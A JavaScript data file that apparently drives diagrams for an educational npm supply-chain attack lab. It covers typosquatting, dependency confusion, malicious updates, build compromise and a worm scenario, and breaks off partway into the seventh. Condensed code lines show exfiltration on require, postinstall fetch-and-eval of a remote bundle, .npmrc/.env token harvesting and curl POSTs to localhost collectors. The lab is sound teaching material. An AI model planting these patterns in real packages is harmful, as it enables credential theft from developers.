/**
 * Dense codeflow diagram detail for scenarios 01–23.
 * Consumed by scripts/diagrams/generate-scenario-codeflow-diagrams.js
 *
 * Facts are grounded in on-disk scenario code (package names, triggers,
 * hosts, ports, endpoints, payload function names). Regenerate SVGs with:
 *   node scripts/diagrams/generate-scenario-codeflow-diagrams.js
 */
'use strict';

/** @type {Record<string, object>} */
const DETAIL = {
  "01": {
    "id": "01",
    "title": "Typosquatting",
    "folder": "01-typosquatting",
    "subtitle": "What the developer sees vs what index.js actually does on require — paths, metadata, payload fields, mock endpoints, and cover traffic",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate/requests-lib",
      "metaRows": [
        [
          "name",
          "requests-lib"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "author",
          "Legitimate Developer"
        ],
        [
          "description",
          "A simple HTTP request library…"
        ],
        [
          "repository",
          "github.com/example/requests-lib"
        ]
      ]
    },
    "malicious": {
      "title": "Installed (victim uses)",
      "path": "malicious-packages/request-lib",
      "metaRows": [
        [
          "name",
          "request-lib  ← missing s"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "author",
          "Attacker (Educational Demo)"
        ],
        [
          "description",
          "… [MALICIOUS - EDUCATIONAL ONLY]"
        ],
        [
          "repository",
          "(none)"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "requests-lib",
        "request-lib  ← missing s",
        true
      ],
      [
        "version",
        "1.0.0",
        "1.0.0",
        false
      ],
      [
        "author",
        "Legitimate Developer",
        "Attacker (Educational Demo)",
        true
      ],
      [
        "description",
        "A simple HTTP request library…",
        "… [MALICIOUS - EDUCATIONAL ONLY]",
        true
      ],
      [
        "repository",
        "github.com/example/requests-lib",
        "(none)",
        true
      ]
    ],
    "deceptionPill": "typo missing s",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"request-lib\": \"file:../malicious-packages/request-lib\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate/requests-lib/index.js",
      "lines": [
        "const http / https / URL",
        "class RequestsLib {",
        "  static async get(url, options)",
        "  static async post(url, data, options)",
        "  static _makeRequest(method, url, data, options)",
        "}",
        "module.exports = RequestsLib",
        "✓ No top-level side effects",
        "✓ No process.env / outbound on import"
      ]
    },
    "malCode": {
      "title": "malicious-packages/request-lib/index.js",
      "lines": [
        "function exfiltrateData() {          ← HIDDEN",
        "  if (TESTBENCH_MODE !== 'enabled')",
        "    log [SAFE MODE]; return",
        "  build payload → http.request POST",
        "  optional uploadJson Floci",
        "}",
        "try { exfiltrateData() }             ← on require",
        "class RequestsLib { get / post / _makeRequest }",
        "module.exports = RequestsLib         ← cover"
      ]
    },
    "codeEdgePill": "same API surface",
    "triggerStrip": "Trigger: require/import (NOT postinstall)  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: RequestsLib still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed malicious-packages/request-lib",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "npm install ../malicious-packages/request-lib",
      "  → node_modules/request-lib → file:",
      "npm start",
      "  = node -r testbench-env.js index.js",
      "  (sets TESTBENCH_MODE if unset)"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/index.js",
        "require(\"request-lib\")"
      ],
      "malBox": [
        "Module evaluates",
        "try { exfiltrateData() }"
      ],
      "payloadTitle": "HTTP request built in exfiltrateData()",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',   // NEVER external",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST',",
        "  headers: { 'Content-Type': 'application/json' }",
        "})",
        "Body: timestamp,",
        "  environment { NODE_ENV, PWD, USER },",
        "  system { platform, nodeVersion, cwd },",
        "  package { name: \"request-lib\", installedAt }"
      ],
      "mockTitle": "mock-server.js on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('01','install-beacon')"
      ],
      "coverTitle": "After beacon: export cover API",
      "coverLines": [
        "module.exports = RequestsLib",
        "RequestLib.get(jsonplaceholder…/posts/1)",
        "→ app prints success (looks healthy)"
      ],
      "visibleLines": [
        "VISIBLE: npm install + API call succeed",
        "HIDDEN: env/system metadata left on require",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Network I/O on module load (require)",
      "2. Reads process.env (PWD, USER, …)",
      "3. Function named exfiltrateData",
      "4. try/catch that swallows errors",
      "5. http to localhost:3000/collect",
      "6. Package name off-by-one vs intended",
      "7. Author / [MALICIOUS] metadata",
      "8. No postinstall — import is enough"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package.json",
      "setup.sh → enable-testbench.sh",
      "npm start → testbench-env.js",
      "No Mock→ES in this mock-server"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "02": {
    "id": "02",
    "title": "Dependency Confusion",
    "folder": "02-dependency-confusion",
    "subtitle": "What the developer sees vs what actually runs — Same @techcorp/auth-lib; public 999.999.999 wins over internal 1.2.3 via >=1.0.0",
    "intended": {
      "title": "Intended (review-only)",
      "path": "internal-packages/@techcorp/auth-lib",
      "metaRows": [
        [
          "name",
          "@techcorp/auth-lib"
        ],
        [
          "version",
          "1.2.3"
        ],
        [
          "path",
          "internal-packages/@techcorp/auth-lib"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "attacker-packages/@techcorp/auth-lib",
      "metaRows": [
        [
          "name",
          "@techcorp/auth-lib"
        ],
        [
          "version",
          "999.999.999"
        ],
        [
          "path",
          "attacker-packages/@techcorp/auth-lib"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "postinstall.js + AuthLib.init"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "@techcorp/auth-lib",
        "@techcorp/auth-lib",
        false
      ],
      [
        "version",
        "1.2.3",
        "999.999.999",
        true
      ],
      [
        "path",
        "internal-packages/…",
        "attacker-packages/…",
        true
      ],
      [
        "payload",
        "(none)",
        "postinstall + exfiltrateConfig",
        true
      ],
      [
        "deception",
        "trusted internal",
        "public ultra-high version",
        true
      ]
    ],
    "deceptionPill": "scoped name + 999.x",
    "victimDep": {
      "label": "corporate-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"@techcorp/auth-lib\": \">=1.0.0\",",
        "  \"@techcorp/data-utils\": \"file:…\""
      ]
    },
    "legitCode": {
      "title": "internal-packages/@techcorp/auth-lib",
      "lines": [
        "class AuthLib { init / authenticate… }",
        "module.exports = AuthLib",
        "✓ No postinstall lifecycle",
        "✓ No TESTBENCH gated network",
        "version 1.2.3 (internal)"
      ]
    },
    "malCode": {
      "title": "attacker-packages/@techcorp/auth-lib",
      "lines": [
        "postinstall.js: anonymous top-level",
        "  if (TESTBENCH_MODE === 'enabled')",
        "    http.request POST localhost:3000/collect",
        "index.js: function exfiltrateConfig(…)",
        "  AuthLib.init → exfiltrateConfig",
        "module.exports = AuthLib          ← cover"
      ]
    },
    "codeEdgePill": "same API surface",
    "triggerStrip": "Trigger: postinstall.js + AuthLib.init → exfiltrateConfig  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: AuthLib still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed attacker-packages/@techcorp/auth-lib",
      "cd corporate-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd corporate-app",
      "npm install  → postinstall fires",
      "npm start",
      "  AuthLib.init(config) → exfiltrateConfig"
    ],
    "runtime": {
      "victimBox": [
        "corporate-app",
        "npm install / AuthLib.init"
      ],
      "malBox": [
        "postinstall.js",
        "exfiltrateConfig(…)"
      ],
      "payloadTitle": "HTTP in postinstall + exfiltrateConfig()",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: package:@techcorp/auth-lib,",
        "  version:999.999.999, attackType,",
        "  phase:postinstall | capturedConfig"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('02','config-exfil')"
      ],
      "coverTitle": "After beacon: AuthLib cover API",
      "coverLines": [
        "module.exports = AuthLib",
        "init / authenticate still succeed",
        "app looks healthy"
      ],
      "visibleLines": [
        "VISIBLE: install + auth API succeed",
        "HIDDEN: postinstall + init beacons",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. @techcorp/auth-lib@999.999.999 from public",
      "2. Range \">=1.0.0\" allows ultra-high version",
      "3. postinstall.js anonymous exfil",
      "4. exfiltrateConfig on AuthLib.init",
      "5. Same scoped name as internal package"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "03": {
    "id": "03",
    "title": "Compromised Package",
    "folder": "03-compromised-package",
    "subtitle": "What the developer sees vs what actually runs — secure-validator@2.5.4 fires on bare require (IIFE) AND on validate* via _reportMetrics",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-package/secure-validator",
      "metaRows": [
        [
          "name",
          "secure-validator"
        ],
        [
          "version",
          "2.5.3"
        ],
        [
          "path",
          "legitimate-package/secure-validator"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-package/secure-validator",
      "metaRows": [
        [
          "name",
          "secure-validator"
        ],
        [
          "version",
          "2.5.4"
        ],
        [
          "path",
          "compromised-package/secure-validator"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "IIFE on require + validate*"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "secure-validator",
        "secure-validator",
        false
      ],
      [
        "version",
        "2.5.3",
        "2.5.4",
        true
      ],
      [
        "path",
        "legitimate-package/…",
        "compromised-package/…",
        true
      ],
      [
        "payload",
        "(none)",
        "_reportMetrics",
        true
      ],
      [
        "trigger",
        "none",
        "IIFE + validate*",
        true
      ]
    ],
    "deceptionPill": "same name; patch bump",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"secure-validator\": \"file:../compromised-package/secure-validator\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate-package/secure-validator",
      "lines": [
        "class SecureValidator {",
        "  validateEmail / validateUrl / …",
        "}",
        "module.exports = SecureValidator",
        "✓ No IIFE side effects",
        "✓ No _reportMetrics network"
      ]
    },
    "malCode": {
      "title": "compromised-package/secure-validator",
      "lines": [
        "function _reportMetrics(type, data) {",
        "  if (TESTBENCH_MODE !== 'enabled') return",
        "  http.request POST localhost:3000/collect",
        "}",
        "(function(){ _reportMetrics(\"module_load\") })()",
        "validateEmail/Url/Input/Password → _reportMetrics",
        "module.exports = SecureValidator   ← cover"
      ]
    },
    "codeEdgePill": "same API surface",
    "triggerStrip": "Trigger: IIFE on bare require + validate* → _reportMetrics  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: SecureValidator still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed compromised-package/secure-validator",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "npm start",
      "  require → IIFE module_load beacon",
      "  + validate* also call _reportMetrics"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/index.js",
        "require + validate*"
      ],
      "malBox": [
        "IIFE module_load",
        "_reportMetrics(…)"
      ],
      "payloadTitle": "HTTP request built in _reportMetrics()",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: attack:compromised-package,",
        "  package secure-validator@2.5.4,",
        "  capturedData { validationType, input }"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('03', …) when set"
      ],
      "coverTitle": "After beacon: SecureValidator cover",
      "coverLines": [
        "module.exports = SecureValidator",
        "validate* still return results",
        "app looks healthy"
      ],
      "visibleLines": [
        "VISIBLE: require + validate succeed",
        "HIDDEN: IIFE + validate* beacons",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. IIFE fires on bare require (module_load)",
      "2. validate* methods also call _reportMetrics",
      "3. Patch bump 2.5.3 → 2.5.4",
      "4. Function named _reportMetrics (telemetry cover)",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "04": {
    "id": "04",
    "title": "Malicious Update",
    "folder": "04-malicious-update",
    "subtitle": "What the developer sees vs what actually runs — utils-helper@2.1.1 runs exfiltrateData() on require; update looks like a bug-fix patch",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-package/utils-helper",
      "metaRows": [
        [
          "name",
          "utils-helper"
        ],
        [
          "version",
          "2.1.0"
        ],
        [
          "path",
          "legitimate-package/utils-helper"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "malicious-update/utils-helper",
      "metaRows": [
        [
          "name",
          "utils-helper"
        ],
        [
          "version",
          "2.1.1"
        ],
        [
          "path",
          "malicious-update/utils-helper"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "require → exfiltrateData()"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "utils-helper",
        "utils-helper",
        false
      ],
      [
        "version",
        "2.1.0",
        "2.1.1",
        true
      ],
      [
        "path",
        "legitimate-package/…",
        "malicious-update/…",
        true
      ],
      [
        "payload",
        "(none)",
        "exfiltrateData",
        true
      ],
      [
        "deception",
        "trusted",
        "malicious patch update",
        true
      ]
    ],
    "deceptionPill": "patch update / bugfix",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"utils-helper\": \"file:../malicious-update/utils-helper\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate-package/utils-helper",
      "lines": [
        "class UtilsHelper { format / … }",
        "module.exports = UtilsHelper",
        "✓ No top-level side effects",
        "✓ No TESTBENCH gated network",
        "version 2.1.0"
      ]
    },
    "malCode": {
      "title": "malicious-update/utils-helper/index.js",
      "lines": [
        "function exfiltrateData() {          ← HIDDEN",
        "  if (TESTBENCH_MODE !== 'enabled') return",
        "  http.request POST localhost:3000/collect",
        "}",
        "try { exfiltrateData() }             ← on require",
        "class UtilsHelper { … }              ← cover",
        "module.exports = UtilsHelper"
      ]
    },
    "codeEdgePill": "same API surface",
    "triggerStrip": "Trigger: require → exfiltrateData()  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: UtilsHelper still works",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "seed malicious-update/utils-helper",
      "cd victim-app && npm install",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "npm start",
      "  require(\"utils-helper\") → exfiltrateData"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/index.js",
        "require(\"utils-helper\")"
      ],
      "malBox": [
        "Module evaluates",
        "try { exfiltrateData() }"
      ],
      "payloadTitle": "HTTP request built in exfiltrateData()",
      "payloadLines": [
        "http.request({",
        "  hostname: 'localhost',",
        "  port: 3000,",
        "  path: '/collect',",
        "  method: 'POST'",
        "})",
        "Body: updateVersion:2.1.1,",
        "  package utils-helper, env/system"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('04','update-exfil')"
      ],
      "coverTitle": "After beacon: UtilsHelper cover",
      "coverLines": [
        "module.exports = UtilsHelper",
        "bug-fix APIs still work",
        "update looks legitimate"
      ],
      "visibleLines": [
        "VISIBLE: update installs + API works",
        "HIDDEN: gated beacon on require",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. Network I/O on module load after update",
      "2. Function named exfiltrateData",
      "3. Patch 2.1.0 → 2.1.1 with side effects",
      "4. try/catch swallows errors",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "05": {
    "id": "05",
    "title": "Build System Compromise",
    "folder": "05-build-compromise",
    "subtitle": "What the developer sees vs what actually runs — build.sh curls secrets; injected dist/app.js beacons on start (main() is cover only)",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-build/build.sh",
      "metaRows": [
        [
          "name",
          "my-app-build"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "legitimate-build/"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "clean build.sh"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-build/build.sh → dist/app.js",
      "metaRows": [
        [
          "name",
          "my-app-build"
        ],
        [
          "version",
          "1.0.0"
        ],
        [
          "path",
          "compromised-build/"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "build.sh curl + dist load"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "my-app-build",
        "my-app-build",
        false
      ],
      [
        "path",
        "legitimate-build/",
        "compromised-build/",
        true
      ],
      [
        "build",
        "clean compile",
        "curl + inject dist",
        true
      ],
      [
        "runtime",
        "clean app",
        "anonymous top-level beacon",
        true
      ],
      [
        "main()",
        "N/A or clean",
        "cover only (not exfil)",
        true
      ]
    ],
    "deceptionPill": "CI build looks normal",
    "victimDep": {
      "label": "victim-app (runs dist artifact)",
      "lines": [
        "no npm attack deps — runs dist/app.js",
        "scripts.start: node … dist/app.js",
        "artifact from compromised-build/"
      ]
    },
    "legitCode": {
      "title": "legitimate-build/build.sh",
      "lines": [
        "mkdir dist; compile clean app.js",
        "✓ No curl to collector",
        "✓ No injected TESTBENCH block",
        "npm test + manifest only"
      ]
    },
    "malCode": {
      "title": "compromised-build/build.sh + dist/app.js",
      "lines": [
        "build.sh (bash): if TESTBENCH_MODE",
        "  curl -X POST localhost:3000/collect",
        "injects dist/app.js top-level if-block",
        "  anonymous http.request on start",
        "function main() { log only } ← COVER",
        "main() is NOT the exfil path"
      ]
    },
    "codeEdgePill": "build injects runtime",
    "triggerStrip": "Trigger: build.sh curl + anonymous top-level on start  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3000/collect  ·  Evidence: infrastructure/captured-data.json  ·  Cover: main() logs only",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "cd compromised-build && ./build.sh",
      "copy dist → victim-app (lab flow)",
      "write infrastructure/mock-server.js"
    ],
    "mockLines": [
      "node infrastructure/mock-server.js",
      "listen http://localhost:3000",
      "init captured-data.json {captures:[]}",
      "POST /collect · GET /captured-data",
      "DELETE /captured-data"
    ],
    "labLines": [
      "cd compromised-build && npm run build",
      "  → build.sh curl secrets",
      "  → writes poisoned dist/app.js",
      "victim-app: npm start → runtime beacon"
    ],
    "runtime": {
      "victimBox": [
        "victim-app/dist/app.js",
        "npm start"
      ],
      "malBox": [
        "build.sh curl",
        "anonymous top-level if"
      ],
      "payloadTitle": "curl (build) + anonymous http.request (runtime)",
      "payloadLines": [
        "BUILD: curl -X POST http://localhost:3000/collect",
        "RUNTIME http.request({",
        "  hostname: 'localhost', port: 3000,",
        "  path: '/collect', method: 'POST'",
        "})",
        "Body: buildType/source:compromised-build,",
        "  environment secrets / NODE_ENV,PWD"
      ],
      "mockTitle": "mock-server :3000 on POST /collect",
      "mockLines": [
        "parse JSON → log CAPTURED DATA",
        "append captures[] → write captured-data.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "floci/exfil.sh secrets|artifacts"
      ],
      "coverTitle": "After beacon: main() cover only",
      "coverLines": [
        "function main() { console.log(…) }",
        "main() — no network",
        "app prints Application running…"
      ],
      "visibleLines": [
        "VISIBLE: build + app start succeed",
        "HIDDEN: curl + injected runtime beacon",
        "HINT: [TESTBENCH] logs + mock CAPTURED DATA"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3000/captured-data",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-data.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. build.sh curls collector during CI",
      "2. Injected anonymous block in dist/app.js",
      "3. main() is cover — not the payload",
      "4. Reads AWS_/DATABASE_ env at build",
      "5. http to localhost:3000/collect"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-data.json",
    "mockPort": "3000",
    "endpointPath": "/collect"
  },
  "06": {
    "id": "06",
    "title": "Shai-Hulud (Self-Replicating)",
    "folder": "06-sha-hulud",
    "subtitle": "What the developer sees vs what actually runs — postinstall fetches /bundle.js from mock CDN; IIFE harvests to credential-harvester :3001",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-package/data-processor",
      "metaRows": [
        [
          "name",
          "data-processor"
        ],
        [
          "version",
          "1.2.0"
        ],
        [
          "path",
          "legitimate-package/data-processor"
        ],
        [
          "role",
          "review-only / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-package/data-processor",
      "metaRows": [
        [
          "name",
          "data-processor"
        ],
        [
          "version",
          "1.2.1"
        ],
        [
          "path",
          "compromised-package/data-processor"
        ],
        [
          "role",
          "installed / active"
        ],
        [
          "trigger",
          "postinstall → eval(bundle.js)"
        ]
      ]
    },
    "compareRows": [
      [
        "name",
        "data-processor",
        "data-processor",
        false
      ],
      [
        "version",
        "1.2.0",
        "1.2.1",
        true
      ],
      [
        "lifecycle",
        "(none)",
        "postinstall→eval bundle",
        true
      ],
      [
        "evidence",
        "N/A",
        "captured-credentials.json",
        true
      ],
      [
        "deception",
        "trusted",
        "CDN second-stage payload",
        true
      ]
    ],
    "deceptionPill": "same name; CDN bundle",
    "victimDep": {
      "label": "victim-app/package.json",
      "lines": [
        "dependencies: {",
        "  \"data-processor\": \"file:../compromised-package/data-processor\"",
        "}"
      ]
    },
    "legitCode": {
      "title": "legitimate-package/data-processor",
      "lines": [
        "exports clean processing API",
        "✓ No postinstall script",
        "✓ No CDN fetch / eval",
        "version 1.2.0"
      ]
    },
    "malCode": {
      "title": "postinstall + templates/bundle.js",
      "lines": [
        "package.json postinstall: node -e …",
        "  http.get localhost:3000/bundle.js",
        "  → eval(d) when TESTBENCH_MODE",
        "bundle.js: anonymous IIFE",
        "  scan .npmrc/.env + env tokens",
        "  POST localhost:3001/collect"
      ]
    },
    "codeEdgePill": "CDN payload / harvest",
    "triggerStrip": "Trigger: postinstall fetch+eval → IIFE harvest  ·  Gate: TESTBENCH_MODE === 'enabled'  ·  Exfil: POST localhost:3001/collect  ·  Evidence: infrastructure/captured-credentials.json  ·  Cover: data-processor API",
    "setupLines": [
      "source enable-testbench.sh",
      "  → TESTBENCH_MODE=enabled",
      "start mock-cdn.js (:3000) + harvester (:3001)",
      "seed compromised-package/data-processor",
      "cd victim-app && npm install"
    ],
    "mockLines": [
      "node infrastructure/mock-cdn.js :3000",
      "  GET /bundle.js",
      "node infrastructure/credential-harvester.js",
      "listen http://localhost:3001",
      "POST /collect · GET /captured-credentials"
    ],
    "labLines": [
      "cd victim-app && npm install",
      "  postinstall pulls /bundle.js",
      "  eval → harvest → :3001/collect",
      "npm start (cover API)"
    ],
    "runtime": {
      "victimBox": [
        "victim-app",
        "npm install postinstall"
      ],
      "malBox": [
        "eval(bundle.js)",
        "anonymous IIFE"
      ],
      "payloadTitle": "HTTP from anonymous IIFE in bundle.js",
      "payloadLines": [
        "EXFIL_URL = 'http://localhost:3001/collect'",
        "POST credentials { files, env, npmrc }",
        "CDN: GET http://localhost:3000/bundle.js",
        "Body: hostname, username, tokens…"
      ],
      "mockTitle": "credential-harvester :3001 POST /collect",
      "mockLines": [
        "parse JSON → log credentials",
        "append → captured-credentials.json → 200"
      ],
      "flociLines": [
        "SCAS_FLOCI_ENABLED=1",
        "uploadJson('06', …) when set"
      ],
      "coverTitle": "After harvest: package still loads",
      "coverLines": [
        "data-processor exports remain usable",
        "GET evidence: /captured-credentials",
        "file: captured-credentials.json"
      ],
      "visibleLines": [
        "VISIBLE: install succeeds",
        "HIDDEN: CDN eval + credential POST",
        "HINT: curl …/captured-credentials"
      ]
    },
    "verifyLines": [
      "curl -s http://localhost:3001/captured-credentials",
      "→ { \"captures\": [ { timestamp, data } ] }",
      "",
      "or read:",
      "  infrastructure/captured-credentials.json",
      "",
      "Optional: floci/verify.sh"
    ],
    "redFlags": [
      "1. postinstall http.get + eval(bundle)",
      "2. Evidence at /captured-credentials (not /captured-data)",
      "3. Dual ports: CDN :3000 + harvester :3001",
      "4. Scans .npmrc / tokens / .env",
      "5. Self-replicating worm narrative"
    ],
    "safetyLines": [
      "TESTBENCH_MODE must be enabled",
      "  else [SAFE MODE] and stop",
      "Exfil hostname is localhost only",
      "Educational labels in package metadata",
      "setup.sh → enable-testbench.sh",
      "localhost / 127.0.0.1 evidence only",
      "No real external C2"
    ],
    "captureFile": "infrastructure/captured-credentials.json",
    "mockPort": "3001",
    "endpointPath": "/collect"
  },
  "07": {
    "id": "07",
    "title": "Transitive Dependency",
    "folder": "07-transitive-dependency",
    "subtitle": "What the developer sees vs what actually runs — Victim depends on web-utils; compromised transitive data-processor@1.2.1 postinstall beacons",
    "intended": {
      "title": "Intended (review-only)",
      "path": "legitimate-packages/data-processor",
      "metaRows": [
        [
          "name",
          "data-processor"
        ],
        [
          "version",
          "1.2.0"
        ],
        [
          "path",
          "legitimate-packages/data-processor"
        ],
        [
          "role",
          "transitive / expected"
        ],
        [
          "trigger",
          "none / clean"
        ]
      ]
    },
    "malicious": {
      "title": "Installed / active (victim uses)",
      "path": "compromised-packages/data-processor",
      "metaRows": [
